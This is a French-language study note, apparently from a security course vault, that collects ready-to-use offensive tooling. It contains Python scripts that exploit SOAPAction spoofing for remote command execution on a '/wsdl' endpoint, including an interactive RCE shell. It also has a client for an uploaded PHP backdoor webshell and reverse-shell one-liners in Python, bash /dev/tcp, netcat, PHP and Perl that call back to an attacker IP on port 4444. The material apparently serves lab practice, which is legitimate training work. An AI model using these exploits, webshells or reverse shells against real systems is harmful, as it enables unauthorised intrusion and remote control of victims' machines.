# ⚙️ ARSENAL — Shells Python (Collection)

> Bibliothèque de shells Python pour la faille **SOAP `/wsdl`** (RCE via [[04 - SOAPAction Spoofing]]), du plus simple au plus complet, + variantes pour d'autres contextes (webshell d'upload, reverse shells). Chaque script est autonome, prêt à copier.

Lié : [[04 - SOAPAction Spoofing]] · [[09 - File Upload]] · [[16 - Arsenal Scripts SQLi]]

---

## 🎯 Quel shell pour quel cas ?

| Situation | Script |
|---|---|
| Test rapide d'une commande sur SOAP | **#1 — Exec basique** |
| Shell "confort" avec sortie propre + `cd` persistant | **#3 — Shell avancé** ⭐ |
| Webshell d'un upload PHP (`?cmd=`) | **#5 — Webshell générique** |
| Passer à un vrai shell interactif | **#6 — Reverse shells** |
| Client SOAP propre (parsing XML) | **#4 — Base réutilisable** |

---

## #1 — SOAP Exec basique (la version du cours)

Le minimum pour exécuter une commande via SOAPAction spoofing.

```python
import requests

payload = ('<?xml version="1.0" encoding="utf-8"?>'
  '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
  'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/">'
  '<soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest>'
  '</soap:Body></soap:Envelope>')

print(requests.post("http://TARGET:3002/wsdl", data=payload,
      headers={"SOAPAction": '"ExecuteCommand"'}).content)
```

## #2 — SOAP Shell interactif simple (`automate.py` du cours)

Boucle infinie, une commande par ligne.

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://TARGET:3002/wsdl", data=payload,
          headers={"SOAPAction": '"ExecuteCommand"'}).content)
```

---

## #3 — SOAP Shell AVANCÉ ⭐ (recommandé)

Améliorations : **sortie propre** (extrait `<result>`, plus le XML brut), **`cd` persistant** (état conservé malgré le stateless), **timeout**, **couleurs**, gestion d'erreurs, mode commande unique (`-c`) ou interactif, échappement XML.

```python
#!/usr/bin/env python3
"""
SOAP RCE Shell — SOAPAction Spoofing
Usage:
  python3 soap_shell.py -u http://TARGET:3002/wsdl            # shell interactif
  python3 soap_shell.py -u http://TARGET:3002/wsdl -c "id"    # commande unique
"""
import requests, argparse, re, os

G, R, Y, B, X = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[0m"

def build(cmd):
    cmd = cmd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return ('<?xml version="1.0" encoding="utf-8"?>'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/">'
        f'<soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest>'
        '</soap:Body></soap:Envelope>')

def run(url, cmd, timeout=15):
    try:
        r = requests.post(url, data=build(cmd),
                          headers={"SOAPAction": '"ExecuteCommand"', "Content-Type": "text/xml"},
                          timeout=timeout)
    except requests.exceptions.ReadTimeout:
        return f"{Y}[!] Timeout{X}"
    except requests.exceptions.RequestException as e:
        return f"{R}[!] {e}{X}"
    m = re.search(r"<result>(.*?)</result>", r.text, re.DOTALL)
    if m:
        return m.group(1).replace("\\n", "\n").rstrip()
    m = re.search(r"<error>(.*?)</error>", r.text, re.DOTALL)
    if m:
        return f"{R}[error] {m.group(1)}{X}"
    return r.text.rstrip()

def interactive(url):
    cwd = "."
    os.system("clear")
    print(f"{G}[+] SOAP RCE shell — {url}{X}")
    print(f"{Y}[i] 'cd' émulé (état conservé) · 'exit' pour quitter{X}\n")
    while True:
        try:
            raw = input(f"{B}soap${X} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not raw:
            continue
        if raw in ("exit", "quit"):
            break
        if raw.startswith("cd "):                      # cd persistant
            newcwd = run(url, f"cd {cwd}/{raw[3:].strip()} 2>/dev/null && pwd")
            if newcwd and not newcwd.startswith(("\033", "[")):
                cwd = newcwd
            else:
                print(f"{R}cd: no such directory{X}")
            continue
        print(run(url, f"cd {cwd} 2>/dev/null; {raw}"))

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-c", "--cmd")
    a = p.parse_args()
    print(run(a.url, a.cmd)) if a.cmd else interactive(a.url)
```

> 💡 Le `cd` est émulé en préfixant chaque commande par `cd {cwd};` — contourne le fait que chaque requête est stateless.

---

## #4 — Base réutilisable (client SOAP paramétrable)

Squelette générique : change l'opération, les champs, le namespace selon le WSDL. Utile aussi pour la **SQLi SOAP** (voir [[16 - Arsenal Scripts SQLi]]).

```python
#!/usr/bin/env python3
import requests

URL = "http://TARGET:3002/wsdl"
NS  = "http://tempuri.org/"

def soap_call(operation, fields, soapaction=None, timeout=15):
    """
    operation  : nom de l'élément Request (ex. 'LoginRequest')
    fields     : dict {nom_champ: valeur}
    soapaction : header SOAPAction (spoofing : différent de l'opération du body)
    """
    body = "".join(f"<{k}>{v}</{k}>" for k, v in fields.items())
    payload = (f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
        f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="{NS}">'
        f'<soap:Body><{operation} xmlns="{NS}">{body}</{operation}></soap:Body></soap:Envelope>')
    headers = {"Content-Type": "text/xml"}
    if soapaction:
        headers["SOAPAction"] = f'"{soapaction}"'
    return requests.post(URL, data=payload, headers=headers, timeout=timeout)

# Exemples :
# RCE via spoofing :  soap_call("LoginRequest", {"cmd": "id"}, soapaction="ExecuteCommand")
# Login normal     :  soap_call("LoginRequest", {"username": "admin", "password": "x"}, soapaction="Login")
if __name__ == "__main__":
    print(soap_call("LoginRequest", {"cmd": "id"}, soapaction="ExecuteCommand").text)
```

---

## #5 — Webshell générique (upload PHP `?cmd=`)

Pour la faille [[09 - File Upload]] (backdoor.php) — pas SOAP. Version enrichie du `web_shell.py` du cours : sortie propre, `cd` persistant, timeout.

```python
#!/usr/bin/env python3
"""
Webshell client — pour un backdoor.php uploadé : <?php system($_REQUEST['cmd']); ?>
Usage: python3 webshell.py -t http://TARGET:3001/uploads/backdoor.php
"""
import requests, argparse, os
from urllib.parse import quote

G, R, B, X = "\033[92m", "\033[91m", "\033[94m", "\033[0m"

def run(target, cmd, timeout=15):
    try:
        return requests.get(f"{target}?cmd={quote(cmd)}", timeout=timeout).text.rstrip()
    except requests.exceptions.RequestException as e:
        return f"{R}[!] {e}{X}"

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-c", "--cmd")
    a = p.parse_args()
    if a.cmd:
        print(run(a.target, a.cmd)); return
    cwd = "."
    os.system("clear")
    print(f"{G}[+] Webshell — {a.target}{X}\n")
    while True:
        try:
            raw = input(f"{B}www$ {X}").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if raw in ("exit", "quit"):
            break
        if not raw:
            continue
        if raw.startswith("cd "):
            new = run(a.target, f"cd {cwd}/{raw[3:].strip()} 2>/dev/null && pwd")
            cwd = new if new and "/" in new else cwd
            continue
        print(run(a.target, f"cd {cwd} 2>/dev/null; {raw}"))

if __name__ == "__main__":
    main()
```

---

## #6 — Reverse shells (le vrai confort)

Une fois le RCE obtenu (SOAP ou webshell), passe à un reverse shell interactif.

**1. Listener sur ta machine :**
```bash
nc -lvnp 4444
# (mieux : rlwrap nc -lvnp 4444  → historique + flèches)
```

**2. Trouver ton IP tun0 :**
```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

**3. Payload à exécuter via le shell RCE** (remplace IP/port) :

```bash
# Python (le plus fiable, celui du cours)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TON_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'

# Bash
bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'

# Netcat (avec -e)
nc -e /bin/sh TON_IP 4444
# Netcat sans -e (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TON_IP 4444 >/tmp/f

# PHP
php -r '$s=fsockopen("TON_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="TON_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

**4. Stabiliser le TTY** (après réception) :
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 🔧 Rappels d'usage

- **`cd` ne persiste jamais** nativement (chaque requête = session isolée) → d'où l'émulation par préfixe `cd {cwd};` dans #3 et #5.
- **Pas d'interactif** (`nano`, `vi`, `top`, `ssh`) via ces shells → utilise un reverse shell (#6).
- **URL-encoder** les espaces/`/` pour le webshell (fait via `quote()` dans #5).
- Toujours mettre un **timeout** (voir SSRF/SQLi où l'absence de timeout bloquait).

Tags : #arsenal #shells #python #soap #reverse-shell
